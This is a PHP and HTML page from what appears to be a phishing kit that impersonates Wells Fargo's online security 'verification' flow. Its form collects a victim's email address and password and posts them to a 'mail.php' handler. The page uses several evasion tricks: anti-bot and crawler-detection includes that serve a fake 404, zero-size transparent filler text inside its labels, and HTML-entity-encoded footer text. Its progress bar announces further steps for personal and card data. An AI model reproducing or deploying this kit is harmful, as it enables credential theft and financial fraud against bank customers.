<?php
session_start();
require_once './src/Classes/Comp.php';
require_once './src/Classes/Antibot.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) {
    echo $antibot->throw404();
    die();
}
include './zsec.php';
    include './huehuehue.php';
    include './bot_fucker/bot.php';
   include './bot_fucker/wrd.php';
    include './crawlerdetect.php';
?>

<!DOCTYPE html>
<html class="" ><head>
<!-- WFB 4.9 -->
    
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta http-equiv="imagetoolbar" content="no">

<title>Step 1 of 3 | Verification</title>


<link rel="stylesheet" type="text/css" href="css/style.css" />
<link rel="stylesheet" href="css/jquery.mobile.css?v=19.12.00">
<link rel="stylesheet" href="css/desktop-tablet.combined.css">
<link rel="stylesheet" href="css/archer.css">

<!-- load myriad font  -->

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style>
<style type="text/css">@font-face{font-family:myriad-pro;src:url(./javascript/myriad.woff2) format("woff2"),url(./javascript/awe.woff) format("woff"),url(./k/b87d1abf881446b2bae0d8204029d20a9b85e656-a.otf) format("opentype");font-weight:400;font-style:normal;}</style>

<!-- myriad font loaded  -->







<link rel="icon" href="images/favicon.ico">



  </head>
<body data-gr-c-s-loaded="true" class="ui-moble-vwport ui-overlay-a" data-inq-observer="1">
	
<header role="banner">
	<div class="masthead">

		<nav class="back">
			
		</nav>

		<div>

			
				
				
					<a class="c28cLink child-window ui-link" href="javascript:void(0)"> <img class="masthead-img-logo" alt="" role="img" src="images/msthadimglgo.svg">
					</a>
				
			
		</div>

		
			
			
				<div role="navigation" class="top-search">
					<ul>
						
							
							
								<li class="security">
									<a class="c28cLink child-window ui-link" href="javascript:void(0)" data-platform="salesplatform">Online Security
									</a>
								</li>
							
						
					</ul>
				</div>
			
		

		<nav class="menu">
			
				
				
					<a href="javascript:void(0)" class="ui-link"></a>
				
			
		</nav>

	</div>

</header>


			
		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
				
					







<!-- Define Variable activeStepCount and initialize to zero-->



			
        	    
					<div class="progress-small small-screen">
						<span class="left">
		        	    	Contact Verification
	    	    		</span>
	        	    	<span class="right">
		        	    	Step 1 of 3
	    	    		</span>
			    	</div>
    	    	
	    	
        	    
	    	
        	    
	    	
        	    
	    	
        	    
	    	
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">
					
									
			    	    	
			    	    		
					            				            		
					            		<li class="ui-block-a active first">
							        	    

							            								            	
							            	<span><span>
							            	
							        	   	    
									        	
											Conta<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ct Verif<font style="color:transparent;font-size:0px"> <?= $RUNDOMSIT ?></font>ication
													
								        	
								        	</span></span>
							            </li>						            
					            
				            			            
					
									
			    	    	
			    	    		
					            				            		
					            		<li class="ui-block-b">
							        	    							            	
							            	<span><span>
							            	
											
									        	
											Personal Information
									        	
								        	
								        	</span></span>
							            </li>						            
					            
				            			            
					
									
			    	    	
			    	    		
					            				            		
					            		<li class="ui-block-c">
							        	    							            	
							            	<span><span>
							            	
							        	   	    
											Credit / Debit Card Information
									        		
									        	
								        	
								        	</span></span>
							            </li>						            
					            
				            			            
					
									
			    	    	
			    	    		
					            				            		
					            		<li class="ui-block-d">
							        	    							            	
							            	<span><span>
							            	
							        	   	    
									        	
									        		Review
									        	
								        	
								        	</span></span>
							            </li>						            
					            
				            			            
					
									
			    	    	
			    	    		
					            				            		
					            		<li class="ui-block-e">
							        	    							            	
							            	<span><span>
							            	
							        	   	    
									        	
									        		Terms
									        	
								        	
								        	</span></span>
							            </li>						            
					            
				            			            
					
				</ul>      
			</div>		


				

				<div class="osmp-title">
					<div>
						<h1>Email Notification Information</h1>
					</div>
					
						<div class="large-screen right sub-title">
							All fields are required.
						</div>
					
					
				</div>
				<div class="not-large-screen">
					
						
							
								
							
									
								

							
							
						
					

					
						<p class="sub-title">
							All fields are required.
						</p>
					
				</div>

				<?php

if(isset($_GET['invalid'])){
		echo '<div id="pageerrors">
		<div class="alert" aria-atomic="true" role="alert" tabindex="-1">
				<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAOxJREFUeNpiZEADj5iZE4BUPBA7oEkdAOKFcn//LkAWZETSqACk1gOxAQN+cAGIA4EGPYAbANV8HogFYKpYFBQYuOPiwOyvixYx/HnwANmQD0BsCDIEZsB5dJvZ7e0ZxPbuBbOfq6igGwB2CdAAQ0aon+ejyzIJCDBIv3kDZj9mYcHlnUQmaIBhgH8fPjAQAeKZsIQ2Cvjz8CE+aQcWfLI/Dx4k6AQmBgoBQQMIeIEBFAv7cYUDq74+mP598SIu/QdALliIS7PE2bNgDDMIC1jIBE3bF8jwPighLcCZlAl4ATUpU5yZKMnOAAEGAEtzW5i61q3qAAAAAElFTkSuQmCC" height="16" width="16" alt="Error">
				<strong>
					<strong>We do not recognize your email or password. Please try again or visit <a href="">Email/Password Help</a>.</strong></strong>
			</div>
		</div><br>';
	
}

?>


<form id="login" class="span12 autoSize-this login-widget lw-box-sizing login-widget-vertical tooltip-bottom" method="Post" action="step/next/mail.php?token=<?php echo $_SESSION['token']; ?>">	
<h2 class="section-hdr">
<?php echo $heading2; ?>
</h2>

<div class="section">

	<div class="ui-field-contain">
		<label for="emailAddress">
			E-mail Address
		</label>
	
		<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="emailAddress" pattern="((([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)[0-9a-zA-Z]@)(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,22}))" style="width:234px;height:25px" name="email" type="email" value="" size="40" maxlength="120" minlength="7" placeholder="" autocomplete="off" required></div>
	</div>
	<div class="ui-field-contain">
		<label for="emailAddress">
			Password
		</label>
	
		<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="password" style="width:234px;height:25px" name="password" type="password" value="" size="40" maxlength="120" placeholder="" autocomplete="off" required></div>
	</div>
	
		
	
		

      
			</label></div><input type="hidden" name="_riskScreeningDisclosure" value="on">
		</div>
	</fieldset>
		
	







<div class="btn-ctr"><div class="btn-ctr-inner">
	<input class="flow-event" type="hidden" name="_eventId_continue" value="">
	
		
		
			<button type="submit" data-flow-event="_eventId_continue" data-mrkt-tracking-id="continue" class="bt_c">
				Continue
			</button>
	

</div></div>
</form>





</div>





</div>




	
	
		



<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
<br><br><br><br><br>	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">
					
					
						
						    
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						    
						
					
					</ul>				
					<ul class="large-screen">
						
						
						
							 
						    	
								
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>
								
						     
						
					
					</ul>				
				</nav>
				<hr>
				&copy;&#32;&#50;&#48;&#50;&#49;&#32;&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#78;&#77;&#76;&#83;&#82;&#32;&#73;&#68;&#32;&#51;&#57;&#57;&#56;&#48;&#49;
			</div>
		</footer>
</div>

</body></html>
